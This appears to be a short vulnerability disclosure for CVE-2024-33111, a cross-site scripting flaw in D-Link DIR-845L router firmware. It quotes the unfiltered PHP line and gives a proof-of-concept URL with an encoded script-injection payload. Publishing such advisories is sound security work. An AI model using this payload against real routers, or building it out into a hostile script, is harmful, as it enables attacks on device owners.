# CVE-2024-33111
D-Link DIR-845L routers version 1.01KRb03 and below are vulnerable to Cross Site Scripting (XSS) via `/htdocs/webinc/js/bsc_sms_inbox.php`.

## Vulnerable Component

- `/htdocs/webinc/js/bsc_sms_inbox.php`

## Technical Details

The vulnerability is due to the lack of filtering in the parameter `$_GET["Treturn"]` which is directly used in code on line 17 of `bsc_sms_inbox.php`.

The vulnerable code snippet:
```php
var get_Treturn = '`<?if($_GET["Treturn"]=="") echo "0"; else echo $_GET["Treturn"];?>';
```

# PoC

```
http://IP:8080/bsc_sms_inbox.php?Treturn=%27%3C/script%3E%3Cscript%3Ealert(1337)%3C/script%3E
```

![image](https://github.com/FaLLenSKiLL1/CVE-2024-33111/assets/43922662/a2df5388-67b6-4c3c-9f97-424d7b55878d)
